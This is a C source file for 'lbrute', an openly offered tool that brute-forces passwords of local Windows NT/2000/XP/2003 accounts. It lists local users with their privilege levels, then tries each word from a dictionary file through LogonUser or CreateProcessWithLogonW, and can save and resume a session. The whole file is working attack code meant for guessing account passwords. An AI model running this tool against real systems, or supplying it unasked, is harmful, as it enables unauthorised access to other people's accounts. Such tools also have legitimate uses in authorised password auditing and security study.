/*
 * lbrute --  Local Windows NT/2K/XP/2K3 accounts password brute forcer.
 *            http://warl0ck.metaeye.org/lbrute.zip
 *
 * Copyright (C) 2005-2006  Pranay Kanwar <warl0ck@metaeye.org>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation; version 2.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * General Public License for more details.
 *
 * A copy of the GNU GPL is available as /usr/doc/copyright/GPL on Debian
 * systems, or on the World Wide Web at http://www.gnu.org/copyleft/gpl.html
 * You can also obtain it by writing to the Free Software Foundation, Inc.,
 * 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA
 */



#define _WIN32_WINNT 0x0502

#define UNICODE

#include <windows.h>
#include <lm.h>
#include <tchar.h>
#include <stdio.h>

#undef stdout
#undef stdin
#undef stderr

#define stderr	STD_ERROR_HANDLE
#define stdin	STD_INPUT_HANDLE
#define stdout	STD_OUTPUT_HANDLE

#define BUFFER_SIZE 8192

#define SAVE_FILE		TEXT("lbrute.ini")
#define	APPNAME			TEXT("LBRUTE")


TCHAR szCompName[MAX_COMPUTERNAME_LENGTH + 1];

HANDLE g_hFile;							/* Handle to the global file*/
DWORD dwTimeTaken=0;					/* Bruteforcing time taken*/

TCHAR *g_OS=NULL;						/* The OS we are running*/
TCHAR *g_szUser=NULL;
TCHAR *g_szPass=NULL;
TCHAR *g_szDictionary;

HANDLE	g_hThread=NULL;					/* Handle to the working thread*/
DWORD	g_dwWords=0;
DWORD	g_dwFilePointer=0;
DWORD	g_count=0;
DWORD	g_attacktype=0;

VOID	PrintInfo(VOID);
TCHAR*	GetOS(VOID);
VOID	Usage(VOID);
VOID	ListLocalUsers(VOID);
BOOL CDECL ConsolePrintf(DWORD dwHandle,TCHAR * szFormat,...);
DWORD WINAPI DictionaryAttackThreadProc(LPVOID lpParameter);
DWORD WINAPI DictionaryAttackThreadProcWIN2K(LPVOID lpParameter);
TCHAR * GetNextWord();
DWORD CountWords(HANDLE hFile);
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);  /* CTRL and shutdown events handler*/
VOID SaveState(LONG lFilePointer,TCHAR *szDictionary);
DWORD LoadState(VOID);
VOID StartDictionaryAttack(TCHAR *szDictionary,TCHAR *szUser,BOOL bResume);



int wmain(int argc,wchar_t * argv[])
{
	SetConsoleCtrlHandler(HandlerRoutine,TRUE);

	PrintInfo();

	switch(argc)
	{
	case 2:
		if(argv[1][0]==L'-' && argv[1][1]==L'l'){
			ListLocalUsers();
			return 0;
		}else if(argv[1][0]==L'-' && argv[1][1]==L'r'){

			g_dwFilePointer=LoadState();

			if(g_attacktype==0)
				StartDictionaryAttack(g_szDictionary,g_szUser,TRUE);

			return 0;
		}
		else
			Usage();
	break;

	case 6:
		if(argv[1][0]==L'-' && argv[1][1]==L'd')
			if(argv[2][0]==L'-' && argv[2][1]==L'u')
				if(argv[4][0]==L'-' && argv[4][1]==L'f') {
				g_attacktype=0;
				StartDictionaryAttack(argv[5],argv[3],FALSE);
			}
			else
				Usage();
		else
			Usage();
	break;

	default:
		Usage();
	}
	return 0;
}

VOID PrintInfo(VOID)
{
	DWORD dwSize=MAX_COMPUTERNAME_LENGTH;
	g_OS=GetOS();

	ConsolePrintf(stdout,TEXT("\n lbrute v0.9 - Windows NT Local logon password brute forcing utility\n")
	                     TEXT(" Copyright (C) 2005-2006  Pranay Kanwar <warl0ck@metaeye.org>\n\n"));
	GetComputerName(szCompName,&dwSize);

	ConsolePrintf(stdout,TEXT(" [+] On %s running %s\n\n"),szCompName,g_OS);
}

TCHAR * GetOS(VOID)
{
	static TCHAR *os;

	OSVERSIONINFO osi;

	osi.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	GetVersionEx(&osi);

	if(osi.dwMajorVersion = 5 && osi.dwMinorVersion == 2 )
		os=TEXT("Windows Server 2003");
	else if(osi.dwMajorVersion = 5 && osi.dwMinorVersion == 1)
		os=TEXT("Windows XP");
	else if(osi.dwMajorVersion = 5 && osi.dwMinorVersion == 0)
		os=TEXT("Windows 2000");
	else if(osi.dwMajorVersion = 4 && osi.dwMinorVersion == 0)
		os=TEXT("Windows NT 4.0");
	else if(osi.dwMajorVersion = 3 && osi.dwMinorVersion == 51)
		os=TEXT("Windows NT 3.51");
	else
		os=TEXT("Unknown");

	return os;
}

VOID Usage(VOID)
{
	ConsolePrintf(stdout,TEXT(" [-] Usage: lbrute [-l] [-r] [ [-d] -u <user> -f <words file>] \n")
		                 TEXT("       -l : List users.\n")
				         TEXT("       -r : Resume an interupted session.\n")
						 TEXT("       -d : Dictionary attack.\n")
						 TEXT("       -u <user> : user account to brute force\n")
				         TEXT("       -f <words file> : words file to use\n"));
	exit(0);
}

VOID ListLocalUsers(VOID)
{
   LPUSER_INFO_2 pBuf = NULL;
   LPUSER_INFO_2 pTmpBuf;
   DWORD dwLevel = 2;
   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
   DWORD dwEntriesRead = 0;
   DWORD dwTotalEntries = 0;
   DWORD dwResumeHandle = 0;
   DWORD i;
   DWORD dwTotalCount = 0;
   NET_API_STATUS nStatus;

   ConsolePrintf(stdout,TEXT("\n [+] Enumerating Users\n\n"));

   do
   {
      nStatus = NetUserEnum(NULL,
                            dwLevel,
                            FILTER_NORMAL_ACCOUNT,
                            (LPBYTE*)&pBuf,
                            dwPrefMaxLen,
                            &dwEntriesRead,
                            &dwTotalEntries,
                            &dwResumeHandle);

	  if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))  {
         if ((pTmpBuf = pBuf) != NULL) {
            for (i = 0; (i < dwEntriesRead); i++) {
               if(pTmpBuf->usri2_priv==USER_PRIV_ADMIN)
			        ConsolePrintf(stdout,TEXT(" %s (Administrator)\n"),pTmpBuf->usri2_name);
               if(pTmpBuf->usri2_priv==USER_PRIV_USER)
			        ConsolePrintf(stdout,TEXT(" %s (User)\n"),pTmpBuf->usri2_name);

			   if(pTmpBuf->usri2_priv==USER_PRIV_GUEST)
			        ConsolePrintf(stdout,TEXT(" %s (Guest)\n"),pTmpBuf->usri2_name);

			   pTmpBuf++;
               dwTotalCount++;
            }
         }
      }
      else
         ConsolePrintf(stderr, TEXT(" [-] Failed to enumerate users: %d\n"), nStatus);

	  if (pBuf != NULL) {
         NetApiBufferFree(pBuf);
         pBuf = NULL;
      }
   }while (nStatus == ERROR_MORE_DATA);

   if (pBuf != NULL)
      NetApiBufferFree(pBuf);
}

BOOL CDECL ConsolePrintf(DWORD dwHandle,TCHAR * szFormat,...)
{
     TCHAR   szBuffer [2500] ;

	 va_list pArgList ;


     va_start (pArgList, szFormat) ;

     _vsnwprintf (szBuffer, sizeof (szBuffer) / sizeof (TCHAR),szFormat,pArgList) ;


     va_end (pArgList) ;

	 return WriteConsole(GetStdHandle(dwHandle),szBuffer,lstrlen(szBuffer),NULL,NULL);
}

VOID StartDictionaryAttack(TCHAR *szDictionary,TCHAR *szUser,BOOL bResume)
{

	DWORD dwThreadId;
	DWORD dwExitCode;
	g_szDictionary=szDictionary;
	g_hFile=CreateFile(  g_szDictionary,
						 GENERIC_READ,
						 FILE_SHARE_READ,
						 NULL,
						 OPEN_EXISTING,
						 FILE_ATTRIBUTE_NORMAL,
						 NULL);

	if(g_hFile==INVALID_HANDLE_VALUE){
		ConsolePrintf(stderr,TEXT(" [-] Failed to open %s, error %d\n"),g_szDictionary,GetLastError());
		return;
	}

	if(bResume==TRUE) {
		SetFilePointer(g_hFile,(LONG)g_dwFilePointer,(LONG)NULL,FILE_BEGIN);
		ConsolePrintf(stdout,TEXT(" [+] Resuming attack.\n"));
	}

	g_szUser=szUser;

	ConsolePrintf(stdout,TEXT(" [+] Counting words...."));
	g_dwWords=CountWords(g_hFile);
	ConsolePrintf(stdout,TEXT("%ld words.\n"),g_dwWords);

	ConsolePrintf(stdout,TEXT(" [+] Trying %ld words from %s for \'%s\'\r\n"),g_dwWords-g_count,g_szDictionary,g_szUser);

	if(lstrcmp(TEXT("Windows 2000"),g_OS)==0)
		g_hThread=CreateThread(NULL,0,DictionaryAttackThreadProcWIN2K,(LPVOID)g_szUser,0,&dwThreadId);
	else
		g_hThread=CreateThread(NULL,0,DictionaryAttackThreadProc,(LPVOID)g_szUser,0,&dwThreadId);

	if(g_hThread==NULL) {
		ConsolePrintf(stderr,TEXT(" [-] Failed to create attack threads.\n"));
		return;
	}

	SetThreadPriority(g_hThread,THREAD_PRIORITY_HIGHEST);

	WaitForSingleObject(g_hThread,INFINITE);

	GetExitCodeThread(g_hThread,&dwExitCode);

	switch(dwExitCode)
	{
	case 0:
		ConsolePrintf(stdout,TEXT("\n [+] List exhausted password not found.\n"));
	break;

	case 1:
		ConsolePrintf(stdout,TEXT("\n [+] Password for user \'%s\' is %s.\n"),g_szUser,g_szPass);
	break;

	}
}
/*On windows 2000 much slower*/

DWORD WINAPI DictionaryAttackThreadProcWIN2K(LPVOID lpParameter)
{
	TCHAR *szUser=(TCHAR*)lpParameter;

	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	si.lpDesktop=NULL;
	si.cb=sizeof(STARTUPINFO);
	si.cbReserved2=0;
	si.lpReserved=0;
	si.lpReserved2=0;
	si.lpTitle=NULL;
	si.wShowWindow=SW_SHOWDEFAULT;


	while(1)
	{
		ConsolePrintf(stdout,TEXT("\r [+] Done %3ld%%."),(int) (100L * g_count/g_dwWords));
		FlushConsoleInputBuffer(GetStdHandle(stdout));
		g_count++;

		g_szPass=GetNextWord();

		if(g_szPass==NULL) break;

		CreateProcessWithLogonW(szUser,szCompName,g_szPass,LOGON_WITH_PROFILE,
				L"~-=+Not+-=-=+any+=-~.exe",NULL,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);

		if(GetLastError()==2) ExitThread(1);
	}
	ExitThread(0);
}

DWORD WINAPI DictionaryAttackThreadProc(LPVOID lpParameter)
{
	TCHAR *szUser=(TCHAR*)lpParameter;
	BOOL b;
	HANDLE hToken;


	while(1)
	{
		ConsolePrintf(stdout,TEXT("\r [+] Done %3ld%%."),(int) (100L * g_count / g_dwWords));
		FlushConsoleInputBuffer(GetStdHandle(stdout));
		g_count++;

		g_szPass=GetNextWord();

		if(g_szPass==NULL) break;

		b=LogonUser(szUser,szCompName,g_szPass,LOGON32_LOGON_NETWORK,LOGON32_PROVIDER_DEFAULT,&hToken);
		if(b != 0) ExitThread(1);

	}
	ExitThread(0);
}



TCHAR * GetNextWord()
{
	static DWORD BytesRead;
	CHAR Buffer[BUFFER_SIZE];
	static TCHAR wBuffer[BUFFER_SIZE];
	LONG i,j;

	ReadFile(g_hFile, Buffer, sizeof(Buffer),&BytesRead,  NULL);

	if(BytesRead==0) return NULL;

	for(i=0;i<BUFFER_SIZE;i++)
			if(*(Buffer+i)==0x0D)
				if(*(Buffer+(++i))==0x0A){
					*(Buffer+i-1)='\0';
					j=BytesRead;
					SetFilePointer(g_hFile,(LONG)(-j+i+1),(LONG)NULL,FILE_CURRENT);
					break;
	}

	MultiByteToWideChar(CP_ACP, 0, Buffer, strlen(Buffer)+1, wBuffer,sizeof(wBuffer)/sizeof(wBuffer[0]) );

	return wBuffer;
}

DWORD CountWords(HANDLE hFile)
{
	DWORD BytesRead;
	DWORD dwLines=0;
	CHAR Buffer[BUFFER_SIZE];
	LONG i,j;

	SetFilePointer(hFile,(LONG)0,(LONG)NULL,FILE_BEGIN);

	while(1)
	{
	ReadFile(hFile, Buffer, sizeof(Buffer),&BytesRead,  NULL);

	if(BytesRead==0) break;

	for(i=0;i<BUFFER_SIZE;i++)
			if(*(Buffer+i)==0x0D)
				if(*(Buffer+(++i))==0x0A){
					*(Buffer+i-1)='\0';
					j=BytesRead;
					dwLines++;
					SetFilePointer(hFile,(LONG)(-j+i+1),(LONG)NULL,FILE_CURRENT);
					break;
		}
	}
	SetFilePointer(hFile,(LONG)0,(LONG)NULL,FILE_BEGIN);
	return dwLines;
}


BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
{
	switch(dwCtrlType)
	{
		case CTRL_C_EVENT:
		case CTRL_BREAK_EVENT:
		case CTRL_CLOSE_EVENT:
		case CTRL_LOGOFF_EVENT:
		case CTRL_SHUTDOWN_EVENT:

			 ConsolePrintf(stdout,TEXT("\r [+] Interupted, saving state and shutting down..."));

				TerminateThread(g_hThread,0);				 /* terminate working thread*/

				SaveState(SetFilePointer(g_hFile,(LONG)0,(LONG)NULL,FILE_CURRENT),g_szDictionary);

				if(g_hFile != NULL) CloseHandle(g_hFile);  /*Close file Handle */

			 ConsolePrintf(stdout,TEXT("OK\n"));
			 ConsolePrintf(stdout,TEXT(" [*] Use -r switch to resume.\n"));
			 ExitProcess(0);

		break;
	}
	return TRUE;
}


VOID SaveState(LONG lFilePointer,TCHAR *szDictionary)
{
	TCHAR szTemp[MAX_PATH];
	TCHAR szSaveFilePath[MAX_PATH];
	ULONG i;

	GetCurrentDirectory(MAX_PATH,szTemp);
	wsprintf(szSaveFilePath,TEXT("%s\\%s"),szTemp,SAVE_FILE);

	for(i=0;i<MAX_PATH;i++)
		szTemp[i]='\0';

	wsprintf(szTemp,TEXT("Attack Type=%ld"),g_attacktype);
	WritePrivateProfileSection(APPNAME,szTemp,szSaveFilePath);

	switch(g_attacktype)
	{

	case 0:
		wsprintf(szTemp,TEXT("%ld"),lFilePointer);
		WritePrivateProfileString(APPNAME,TEXT("Offset"),szTemp,szSaveFilePath);
		wsprintf(szTemp,TEXT("%s"),szDictionary);
  		WritePrivateProfileString(APPNAME,TEXT("Dictionary"),szDictionary,szSaveFilePath);
		WritePrivateProfileString(APPNAME,TEXT("User"),g_szUser,szSaveFilePath);
		wsprintf(szTemp,TEXT("%ld"),g_count);
		WritePrivateProfileString(APPNAME,TEXT("Count"),szTemp,szSaveFilePath);
	break;
	}
}

DWORD LoadState(VOID)
{
	static TCHAR szUser[MAX_PATH];
	static TCHAR szDictionary[MAX_PATH];
	DWORD  dwFP;

	TCHAR szTemp[MAX_PATH];
	TCHAR szSaveFilePath[MAX_PATH];

	GetCurrentDirectory(MAX_PATH,szTemp);
	wsprintf(szSaveFilePath,TEXT("%s\\%s"),szTemp,SAVE_FILE);

	GetPrivateProfileString(APPNAME,TEXT("Attack Type"),TEXT("0"),szTemp,MAX_PATH,szSaveFilePath);

	swscanf(szTemp,TEXT("%ld"),&g_attacktype);

	if(g_attacktype==0) {
		GetPrivateProfileString(APPNAME,TEXT("Dictionary"),TEXT("C:\\words.dic"),szDictionary,MAX_PATH,szSaveFilePath);
		GetPrivateProfileString(APPNAME,TEXT("Offset"),TEXT("0"),szTemp,MAX_PATH,szSaveFilePath);
		swscanf(szTemp,TEXT("%ld"),&dwFP);
		GetPrivateProfileString(APPNAME,TEXT("Count"),TEXT("0"),szTemp,MAX_PATH,szSaveFilePath);
		swscanf(szTemp,TEXT("%ld"),&g_count);
		GetPrivateProfileString(APPNAME,TEXT("User"),TEXT("administrator"),szUser,MAX_PATH,szSaveFilePath);
		g_szUser=szUser;
		g_szDictionary=szDictionary;
	}
	return dwFP;
}
